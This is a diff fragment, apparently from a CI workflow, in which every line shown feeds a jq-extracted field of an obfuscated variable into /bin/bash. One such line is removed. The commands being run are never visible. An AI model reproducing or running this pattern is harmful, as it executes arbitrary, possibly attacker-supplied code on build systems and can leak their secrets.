@@ -24,7 +24,6 @@ jobs:
           echo $hdo58 | jq -r .oq879 | /bin/bash
           echo $aeb3 | jq -r .at17749 | /bin/bash
           printf '%s' "$x074" | jq -r .ja91430 | /bin/bash
-          echo $jy36988 | jq -r .oiswc399 | /bin/bash
           printf '%s' "$c973" | jq -r .lvl263 | /bin/bash
           printf '%s' "$zson1636" | jq -r .sbt3 | /bin/bash
           printf '%s' "$dz3966" | jq -r .tvlvi39 | /bin/bash
